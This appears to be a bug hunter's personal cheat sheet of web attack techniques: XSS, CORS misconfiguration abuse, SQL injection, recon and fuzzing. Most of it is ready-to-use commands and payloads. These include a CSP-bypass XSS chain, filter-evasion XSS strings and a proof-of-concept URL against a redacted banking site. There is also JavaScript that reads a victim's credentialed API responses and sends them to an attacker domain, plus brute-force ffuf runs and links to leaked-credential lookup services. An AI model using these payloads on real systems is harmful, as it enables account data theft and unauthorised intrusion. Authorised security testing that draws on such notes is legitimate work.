  when CSP is not your friend   "lol". We can no longer execute inline JS, so we cannot directly inject a reflected XSS payload. Furthermore, we now also can’t load JS resources outside of the application’s own origin ..  To bypass the CSP policy and get back to our ever-reliable alert box we can use this 2nd injection URL as the source for the first XSS injection script - think XSS-inception (Remember to use double URL encoding):
   
   ?name=Bob<script src='https://demoapp.loc/js/script?v=1.7.3.css%2522/>%2527)%3Balert(%2522Yeah!%2520Chaining!%2522)%3B//'></script>
  
 NOTE:    allow try to copying CSRF token from a different browser session and see if you can reuse it // this could to lead to chainging xss with csrf AND CSRF BYPASS
 
 
 
 xss oneliner   //   
        How to Hunt Blind XSS using Dalfox //
  waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b blindxss.xss.ht pipe > output.txt
  
   How to Hunt Reflected XSS
  waybackurls testphp.vulnweb.com| grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
    
    Find the parameters which are not filtering special characters - One Liner
     echo "test.url" | waybackurls | grep "=" | tee waybackurls.txt
cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)" | qsreplace '"><()'| tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "\"><()" && echo -e "$host \033[91m Vullnerable \e[0m \n" || echo -e "$host  \033[92m Not Vulnerable \e[0m \n"; done | tee XSS.txt




  CORS  BYPASSING / MISCONFIGURED
  
  hunting 1 (single target)
  
  Step->1. Capture the target website and spider or crawl all the website using burp.
 Step->2. Use burp search look for Access-Control
 Step->3. Try to add Origin Header i.e,Origin:attacker.com or Origin:null or Origin:attacker.target.com or Origin:target.attacker.com
 Step->4  If origin is reflected in response means the target is vuln to CORS
 
 hunting 2 (muitple target)
 step 1-> find domains i.e subfinder -d target.com -o domains.txt
 step 2-> check alive ones : cat domains.txt | httpx | tee -a alive.txt
 step 3-> send each alive domain into burp i.e, cat alive.txt | parallel -j 10 curl --proxy "http://127.0.0.1:8080" -sk 2>/dev/null
 step 4-> Repeat hunting method 1
 
   (1) Automate Way 
    step1-> find domains i.e, subfinder -d domain.com -o target.txt
  step2-> grep alive: cat target.txt | httpx | tee -a alive.txt
  step3-> grep all urls using waybackurls by @tomnomnom and gau tool i.e,cat alive.txt | gau | tee -a urls.txt
  step4-> run any of these tools on each url 
  step5-> configure the manually
  
    ////Tools  for 1/////
    https://github.com/chenjj/CORScanner
    https://github.com/lc/theftfuzzer
    https://github.com/Shivangx01b/CorsMe
    
    automation 2 
    1) Find Domains with the help of subfinder,assetfinder,findomain i.e , subfinder -d target.com | tee -a hosts1 , findomain -t target.com | tee -a hosts1 , assetfinder --subs-only target.com |tee -a hosts1 .
  2) Then cat hosts1 | sort -u | tee -a hosts2 and then cat hosts2 | httpx | tee -a hosts .
   3) Navigate through terminal where hosts file is located  echo "/" > paths
   4) Then type meg -v
  5) After the completion of process type gf cors.
  6) All the urls with Access-Control-Allow will be displayed.
  
  
   tools need for 2 
   https://github.com/tomnomnom/meg
   https://github.com/tomnomnom/gf
   https://github.com/projectdiscovery/subfinder
  
   https://github.com/tomnomnom/assetfinder
   https://github.com/Findomain/Findomain
   https://github.com/projectdiscovery/httpx
  
  
  TIP
  ALWYS CHECK IF THE WEBSITES ALWSY TRUST ANT SUBDOMAIN THROW AT IT, IF YES , FIND THE XSS ON THE SUBDOMAIN  or any subdomain it trustes    //CHECK FOR GUIDANCE AT https://danielantonsen.com/abusing-cors-improper-origin-validation/
  
  examples
  function cors() {  
var xhttp = new XMLHttpRequest();  
xhttp.onreadystatechange = function() {    
    if (this.status == 200) {    
    alert(this.responseText);     
    document.getElementById("demo").innerHTML = this.responseText;    
    }  
};  
xhttp.open("GET", "https://www.redacted.com/api/return", true);  
xhttp.withCredentials = true;  
xhttp.send();
}
cors();
   
   POCS
    https://banques.redacted.com/choice-quiz?form_banque="><script>function%20cors(){var%20xhttp=new%20XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200) alert(this.responseText);document.getElementById("demo").innerHTML=this.responseText}};xhttp.open("GET","https://www.redacted.com/api/return",true);xhttp.withCredentials=true;xhttp.send()}cors();</script>&form_cartes=73&iframestat=1
  
  
  
  tip
  💡
  A server may (at times) respond with CORS headers ONLY if the Origin header is set in the request. If this Origin header is not there already then try adding it.
  
  GET
  var xhr = new XMLHttpRequest(); 
xhr.onload = reqListener; 
xhr.open('GET','https://target.example.com/endpoint/',true); 
xhr.withCredentials = true;
xhr.send();

// leak json response to attacker domain
function reqListener() {
    location='https://attackerdomain.com/?response='+this.responseText; 
};
  POST
  var postdata = "fname=Henry&lname=Ford"

var xhr = new XMLHttpRequest(); 
xhr.onload = reqListener; 
xhr.open("POST", 'https://target.example.com/endpoint/', true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;
xhr.send(postdata);

// leak json response to attacker domain
function reqListener() {
    location='https://attackerdomain.com/?response='+this.responseText; 
};
  
  many servers programmatically generate the Access-Control-Allow-Origin header based on the user-supplied Origin value. This is the single most common CORS vulnerability. If you see a HTTP response with any Access-Control-* headers but no origins declared, this is a strong indication that the server will generate the header based on your input. Other servers will only send CORS headers if they receive a request containing the Origin header, making associated vulnerabilities extremely easy to miss.



 BLACK BOX CORS TESTING 
  TEST THE APPLICTAION FOR DYNAMIC GENERATION
  	does it reflect the user -supplied ACAO header  If it is set to a wildcard (*) or is too permissive, it can indicate a vulnerability        // origin :https://attacker.com    0R  *
  	does it only validate on the start/ end of a specific string ? .  the results from wrong regex expresion   // origin :https://attacker.com.smart.com    OR  https://smart.attacker.com
  	does it allow the null origin        ///    origin: null
  	does it restrict the protocol
  	does it allow credential when option 2 ( does it only validate on the start/ end of a specific string ) is true   // no browers accept this as true using only wild card * it invalidate it 
  //	When responding to a credentialed request,  server must specify a domain, and cannot use wild carding
   
  

Access-Control-Allow-Methods: This header defines which HTTP methods (e.g., GET, POST) are allowed in cross-origin requests.
Access-Control-Allow-Headers: This header specifies the HTTP headers that can be used in the actual request.
Access-Control-Allow-Credentials: If this is set to true, it means that the website allows credentials (e.g., cookies) to be included in cross-origin requests. This should be used cautiously.


   the following table summarizes the exploitability based on the CORS configuration:
   
   acces control-Allow-Origin” value          Access-Control-Allow-Credentials” value                 Exploitable
   https://attacker.com                                true                                                     yes
     null                                                true                                                  yes
     *                                                  true                                                    no
     
     
    THE  BASIC TECHNIQUE  WHEN ACCES-CONTROL-ALLOW- CREDENTIAL IS SET TO TRUE
     var req = new XMLHttpRequest();
req.onload = reqListener;
req.open(“get”,”https://vulnerable.domain/api/private-data”,true);
req.withCredentials = true;
req.send();
function reqListener() {
 location=”//attacker.domain/log?response=”+this.responseText;
};
  

 \\ USING CURLS WHEN TESTIN FOR CORS //
  curl -X GET https://example.com
  
  curl -X GET -I https://example.com
  curl -X GET -H "Origin: https://otherdomain.com" https://example.com
  
  curl -X GET -I -H "Origin: https://otherdomain.com" https://example.com
   curl -X POST -I https://example.com

  curl -X POST -I https://example.com
  curl -X POST -I -H "Origin: https://otherdomain.com" https://example.com
  
  curl -X PUT -I https://example.com
  curl -X PUT -I -H "Origin: https://otherdomain.com" https://example.com

  curl -X DELETE -I -H "Origin: https://otherdomain.com" https://example.com
  curl -X DELETE -I https://example.com

  curl -X OPTIONS -I -H "Access-Control-Request-Method: POST" -H "Origin: https://otherdomain.com" https://example.com           //This command tests how the website handles cross-origin 
                                                                                                                                  requests with credentials (e.g., cookies). Replace
                                                                                                                                   "YOUR_SESSION_COOKIE" with a valid session cookie. //

curl https://my.target.com/api/web/user -H "Origin: https://geekboy.ninja" -I 


  
    STEP BY STEP USING THE DEVELOPER BROWERS TOOL
    
    OPEN THE browers and go to the website , go to the developer tool when right click 
    check on the netwrok tab/ console
    
    go to different website and copy its url , open the developer tools and 
    type a command to make a request to the first website (the testing websites)
    OBSERVE THE RESULT
    
   After you send the request, check what happens in the developer tools. If everything is set up correctly (good CORS), the request might be blocked, and you'll see an error message. 
 
   But if the request goes through without any problems (bad CORS), 

    always Repeat and Experiment:

  Try different websites and different types of requests (GET, PUT, PATCH, POST, DELETE,OPTION AND HEAD ).
  

    Javascript Script For Testing Cors
    
    // Replace these with your target website and the origin you want to test.
const targetURL = 'https://example.com';
const customOrigin = 'https://attacker.com';

// Create a fetch request with a custom origin header.
fetch(targetURL, {
  method: 'GET', // You can use different methods like POST, PUT, DELETE, etc.
  headers: {
    'Origin': customOrigin,
  },
})
  .then(response => {
    console.log('Response status:', response.status);
    // Check if the response headers indicate that the request was allowed.
    if (response.headers.get('Access-Control-Allow-Origin') === customOrigin) {
      console.log('CORS is potentially misconfigured.');
    } else {
      console.log('CORS is properly configured.');
    }
  })
  .catch(error => {
    console.error('Error:', error);
  });

  
  




  
  
  
    










 
 
 
 

 sql injection
 
 SQL Injectjon for Contact/Registration Forms .

1. sqlmap -u http://target.com/registration --dbs --forms --crawl=2
2. it will crawl all the links having input field
3. select the parameter you want to test
 
 '"<svg/onload=prompt(5);>{{7*7}}
 
 

HTTPX scanning a guide

scanning using HTTPX and detecting techs running the page
echo "http://testphp.vulnweb.com" | httpx
echo "(url)" | httpx

Subdomain enum using subfinder and scan using HTTPX
subfinder -d vulnweb.com | httpx -title -status-code -tech-detect -follow-redirects


echo "http://google.co.in" | httpx -sc -cl -ct -location

echo "https://shodan.io" | httpx -probe -ip -cdn
echo "http://testphp.vulnweb.com" | httpx -lc -wc
echo "http://testphp.vulnweb.com" | httpx -debug

echo "http://hackerone.com" | httpx -pa -probe

echo "http://testphp.vulnweb.com" | httpx -probe -sc -path "/login.php"

sql injection in httpx
echo "http://testphp.vulnweb.com" | httpx -path "/listproducts.php?cat=1’" -ms "Error: You have an error in your SQL syntax;"

for xss injection

echo "http://testphp.vulnweb.com" | httpx -path "/listproducts.php?cat=<script>alert(1)</script>" -ms "<script>alert(1)</script>"

for login
echo "http://testphp.vulnweb.com" | httpx -debug-resp -x post -path "/userinfo.php" -H "Cookie: login=test%2Ftest" -body "uname=test&pass=test"

run through proxy
echo "http://testphp.vulnweb.com" | httpx -x all -probe -http-proxy http://127.0.0.1:8080

subfinder -d hackerone.com | httpx -timeout 10 | katana -proxy http://127.0.0.1:8080 -jc -aff 


fuff scaning " a detailed guide"
simple attack
ffuf -u http://testphp.vulnweb.com/FUZZ/ -w dict.txt

muitiple wordlist attack
ffuf -u https://ignitetechnologies.in/W2/W1/ -w dict.txt:W1 -w dns_dict.txt:W2

searching for specific extension
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -e .php

working on sql injection
ffuf -request brute.txt -request-proto http -mode clusterbomb -w users.txt:HFUZZ -w pass.txt:WFUZZ -mc 200
the brute.txt was developed by burp during interception, whereby Put HFUZZ in front of uname and WFUZZ in front of the pass.then procced using cluster bumb .... //check fuff doc in hackingarticles

filter code
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -fc 302      filter code
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -fs 2929      filter size

MAXIMUN TIME
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -fs 2929

verbose mode 
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -v

treads mode
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -t 1000


ATTACK WITH COOKIES
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -b "PHPSESSID:"7aaaa6d88edcf7cd2ea4e3853ebb8bde""
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -u  (url/ IP) -H 'Origin: http://FUZZ.crossfit.htb' -mr "Access-Control-Allow-Origin" -ignore-body


DIRECTORY TRAVEREY
....\/
.....
  ##check for URL encodeing
  %2527 becomes %27        this is also used in sql injection
  
 
 
 
 
 
 
 


#https://github.com/codingo/VHostScan
VHostScan -t example.com





BYPASSING XSS FILTERS

&#60;script&#62;alert(1)&#60;/script&#62;

%3Cscript%3Ealert(1)%3C/script%3E       if the filter only works for plain text string

\\x3cscript\\x3ealert(1)\\x3c/script\\x3e            if filter only looks for alphabatical string

\\u003cscript\\u003ealert(1)\\u003c/script\\u003e        if the filter looks for ASCII strings

%26#x6c;t;\\x73cript&#62;\\u0061lert(1)%26#x6c;t;/\\x73cript&#62;



If you are attacking the 
    /api/v3/sign-up endpoint try to perform bruteforce to /Sing-up, /SignUp, /singup...
Also try appending to the original endpoint bytes like %00, %0d%0a, %0d, %0a, %09, %0C, %20








check the appas a consumer anddd strike payload according to laugauage and application used

check for objecct tools --dev tools(chrome)

check for authentictaion like useername ,Email,oauth,mfA

CHECK FOR OPEN PORT TOOLS MASSCAN, PORT COMMONLY USED 80, 441, 81
DIG,WHOIS,WHATWEB,MAP

SUDDOMMAIN ENUM and new parameter

ARUJUN, DIRB,NUCLEAR,gobuster




curl https://jldc.me/anubis/subdomains/tesla.com | jq -r ".[]"

dnsrecon -a -d floqast.com  

puredns bruteforce all.txt domain.com


assetfinder --subs-only <domain>
/subfinder-linux-amd64 -d tesla.com [-silent]


dnsrecon -r <DNS Range> -n <IP_DNS>   #DNS reverse of all of the addresses
dnsrecon -d facebook.com -r 157.240.221.35/24 #Using facebooks dns
dnsrecon -r 157.240.221.35/24 -n 1.1.1.1 #Using cloudflares dns
dnsrecon -r 157.240.221.35/24 -n 8.8.8.8 #Using google dns

GOOGLE DORK AND GITHUB DORKING

CHECK FOR SOURCE CODE

SHODAN    tools = 

shodan domain <domain>
get pages link to subdomain
shodan search "http.html:help.domain.com"

shodan search org:"Target" http.favicon.hash:116323821 --fields ip_str,port --separator " " | awk '{print $1":"$2}' , 



in the broswer dns

ffuf -c -w /path/to/wordlist -u http://victim.com -H "Host: FUZZ.victim.com"



gobuster vhost -u https://mysite.com -t 50 -w subdomains.txt

wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403 -H "Host: FUZZ.example.com" -u http://example.com -t 100

subfinder -d hackerone.com | httpx -timeout 10 | katana -proxy http://127.0.0.1:8080 -jc -aff 





25 code/command injection and RCE vul

?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}



#https://github.com/codingo/VHostScan
VHostScan -t example.com


screenshoot tools
eyewitness , htttpscreenshot, shutter


email finder
hunter.io
theharvester
 https://hunter.io
 
credentils lookeup
https://www.dehashed.com/
https://leak-lookup.com


credential leak and api
https://github.com/carlospolop/Leakos
https://github.com/carlospolop/Leakos

https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets


google dorks
https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets
https://github.com/carlospolop/Gorks


EXPOLIT DB

HOW IS THE SESSION ESTABLISHED TOOLS -> devtools-> storage -> session

check for code reveiw

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/code-review-tools
https://app.snyk.io/



check for minor framwork and app use and payload the framework

ask how does it handle sspecial characters

how is user idntify





check for api
If you are attacking the /api/v3/sign-up endpoint try to perform bruteforce to /Sing-up, /SignUp, /singup...
Also try appending to the original endpoint bytes like %00, %0d%0a, %0d, %0a, %09, %0C, %20



is capcha used

does the site allow for user impersoniation , sensitive information being used, check idf websocket are used

is cors implemented
can you uplaod files  
check for owasp toplist


does the site allows for webhook url 

what htpp request are made

validate csrf token

open redirect xss 

check vulnerabilities in series

check for takeways when testin a vulnerabilities

